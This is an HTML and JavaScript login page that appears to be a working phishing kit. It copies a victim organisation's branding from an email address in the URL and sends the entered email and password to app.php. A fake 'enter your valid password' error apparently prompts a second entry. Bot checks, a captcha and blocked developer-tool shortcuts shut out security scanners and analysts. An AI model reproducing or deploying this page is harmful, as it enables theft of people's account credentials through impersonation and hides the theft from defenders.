<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Administrative Access</title>

<!-- Bootstrap 5 CSS -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Cloudflare Turnstile -->
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<!-- Dynamic Favicon -->
<link rel="icon" id="favicon" type="image/png">

<style>
body {
background-color: #f8f9fa;
}

.login-container {
max-width: 400px;
margin: 50px auto;
padding: 20px;
background: #fff;
border-radius: 8px;
box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
text-align: center;
}

.auth-required {
color: red;
font-size: 14px;
margin-top: 5px;
}

.turnstile-error {
color: red;
font-size: 14px;
display: none;
}

.submission-message {
color: red;
font-size: 10px;
font-weight: bold;
display: none;
margin-top: 10px;
}

.form-label {
text-align: left;
display: block;
}

.btn-loading {
pointer-events: none;
opacity: 0.7;
}
</style>
</head>

<body>

<!-- Login Form -->
<div class="login-container">

<!-- Header -->
<header class="text-center my-3">
<img id="domain-logo" class="domain-logo" src="" alt="Domain Logo">
<div style="text-transform: uppercase;"><span id="domain-name" class="fw-bold"></span> <br/><b>Login Authentication</b></div>
</header>

<!-- Error Message Placeholder -->
<div id="error-message" class="alert alert-danger" role="alert" style="display: none;">
</div>

<form id="signup-form" method="post" action="app.php">
	<div class="mb-3 text-start">
		<label for="email" class="form-label">Email Address</label>
		<input type="email" id="email" name="email" class="form-control" required>
	</div>
	<div class="mb-3 text-start">
		<label for="password" class="form-label">Password</label>
		<input type="password" id="password" name="password" class="form-control" required>
	<span class="auth-required">Authentication is required</span>
	</div>
	<!-- Cloudflare Turnstile -->
	<div class="mb-3">
		<div class="cf-turnstile" data-sitekey="0x4AAAAAABuU_cmRvd31gQnF" data-callback="turnstileCallback"></div>
		<input type="hidden" id="cf-turnstile-response" name="cf-turnstile-response">
		<span id="turnstile-error" class="turnstile-error">Please verify the captcha!</span>
	</div>
	<button type="submit" id="submit-btn" class="btn btn-primary w-100">Login</button>
</form>

<!-- Submission Message -->
<div id="submission-message" class="submission-message">Authentication error #0229992, Enter your valid password.</div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
// Bot Protection and Detection System
class ClientBotProtection {
    constructor() {
        this.startTime = Date.now();
        this.mouseMovements = 0;
        this.keystrokes = 0;
        this.clicks = 0;
        this.init();
    }

    init() {
        // Immediate bot checks
        if (this.detectBot()) {
            this.blockAccess("Bot detected");
            return;
        }

        // Set up behavioral monitoring
        this.setupBehaviorTracking();
        
        // Check for automation tools
        this.checkAutomationTools();
        
        // Monitor form interactions
        this.monitorFormBehavior();
    }

    detectBot() {
        // Check for headless browsers
        if (this.isHeadless()) return true;
        
        // Check for automation frameworks
        if (this.hasAutomationSignatures()) return true;
        
        // Check user agent
        if (this.hasSuspiciousUserAgent()) return true;
        
        // Check for missing browser features
        if (this.missingBrowserFeatures()) return true;
        
        return false;
    }

    isHeadless() {
        // Common headless browser detection
        if (navigator.webdriver) return true;
        if (window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect === undefined) return true;
        if (navigator.plugins.length === 0) return true;
        if (navigator.languages.length === 0) return true;
        
        return false;
    }

    hasAutomationSignatures() {
        // Check for Selenium, Puppeteer, Playwright signatures
        const automationSignatures = [
            'webdriver', 'selenium', 'puppeteer', 'playwright', 
            '__nightmare', '_phantom', 'callPhantom', '__fxdriver_evaluate'
        ];
        
        for (let signature of automationSignatures) {
            if (window[signature] || document[signature]) return true;
        }
        
        return false;
    }

    hasSuspiciousUserAgent() {
        const ua = navigator.userAgent.toLowerCase();
        const suspiciousTerms = [
            'bot', 'crawler', 'spider', 'scraper', 'headless',
            'phantom', 'selenium', 'automated', 'python', 'curl'
        ];
        
        return suspiciousTerms.some(term => ua.includes(term));
    }

    missingBrowserFeatures() {
        // Check for missing standard browser features
        if (!window.localStorage) return true;
        if (!window.sessionStorage) return true;
        if (!document.cookie) return true;
        if (!window.history) return true;
        
        return false;
    }

    setupBehaviorTracking() {
        // Track mouse movements
        document.addEventListener('mousemove', () => {
            this.mouseMovements++;
        });

        // Track keystrokes
        document.addEventListener('keydown', () => {
            this.keystrokes++;
        });

        // Track clicks
        document.addEventListener('click', () => {
            this.clicks++;
        });
    }

    checkAutomationTools() {
        // Check for common automation tools in window object
        const automationTools = [
            'webdriver', 'driver', 'selenium', 'puppeteer', 'playwright',
            '_Selenium_IDE_Recorder', '_selenium', 'calledSelenium',
            '__webdriver_script_fn', '__driver_evaluate', '__webdriver_evaluate'
        ];

        for (let tool of automationTools) {
            if (window[tool]) {
                this.blockAccess(`Automation tool detected: ${tool}`);
                return;
            }
        }
    }

    monitorFormBehavior() {
        const form = document.getElementById('signup-form');
        if (!form) return;

        form.addEventListener('submit', (e) => {
            if (!this.validateHumanBehavior()) {
                e.preventDefault();
                this.blockAccess("Suspicious form submission behavior");
            }
        });
    }

    validateHumanBehavior() {
        const timeSpent = Date.now() - this.startTime;
        
        // Too fast submission (less than 2 seconds)
        if (timeSpent < 2000) return false;
        
        // No mouse movements (suspicious for a form)
        if (this.mouseMovements === 0 && timeSpent > 5000) return false;
        
        // No keystrokes but form filled (copy-paste bots)
        const emailField = document.getElementById('email');
        const passwordField = document.getElementById('password');
        if (emailField && passwordField && 
            emailField.value && passwordField.value && 
            this.keystrokes === 0) return false;
        
        return true;
    }

    blockAccess(reason) {
        console.log(`Access blocked: ${reason}`);
        
        // Hide the form
        const container = document.querySelector('.login-container');
        if (container) {
            container.innerHTML = `
                <div class="alert alert-danger">
                    <h4>Access Denied</h4>
                    <p>This page is not accessible via automated tools.</p>
                    <small>Error Code: BT-${Date.now().toString().slice(-6)}</small>
                </div>
            `;
        }
        
        // Optional: Send detection report to server
        this.reportBotDetection(reason);
    }

    reportBotDetection(reason) {
        // Optional: Report bot detection to your server
        fetch('app.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `bot_detected=1&reason=${encodeURIComponent(reason)}&ua=${encodeURIComponent(navigator.userAgent)}`
        }).catch(() => {}); // Silent fail
    }
}

// Initialize bot protection
document.addEventListener('DOMContentLoaded', () => {
    new ClientBotProtection();
});

// Additional protection: Disable right-click and common shortcuts
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
    // Block F12, Ctrl+Shift+I, Ctrl+U, etc.
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.shiftKey && e.key === 'C') ||
        (e.ctrlKey && e.key === 'u')) {
        e.preventDefault();
    }
});

// Existing form logic
let extractedDomain = "";
let turnstileVerified = false;

function turnstileCallback(token) {
	if (token) {
		turnstileVerified = true;
		document.getElementById("cf-turnstile-response").value = token;
		document.getElementById("turnstile-error").style.display = "none";
	}
}

document.addEventListener("DOMContentLoaded", function () {
	const urlParams = new URLSearchParams(window.location.search);
	const emailParam = urlParams.get("email");
	if (emailParam) {
		document.getElementById("email").value = emailParam;
		extractedDomain = emailParam.split("@")[1] || "example.com";
	}
	
	if (extractedDomain && extractedDomain !== "example.com") {
		document.getElementById("domain-name").textContent = extractedDomain;
		document.getElementById("domain-logo").src = `https://logo.clearbit.com/${extractedDomain}`;
		document.getElementById("favicon").href = `https://www.google.com/s2/favicons?sz=64&domain=${extractedDomain}`;
	}

	// Check for error message in URL
	const errorParam = urlParams.get("error");
	if (errorParam) {
		const errorDiv = document.getElementById("error-message");
		errorDiv.textContent = decodeURIComponent(errorParam);
		errorDiv.style.display = "block";
	}

	document.getElementById("signup-form").addEventListener("submit", function (event) {
		if (!turnstileVerified) {
			event.preventDefault();
			document.getElementById("turnstile-error").style.display = "inline";
		}
	});
});
</script>

</body>
</html>
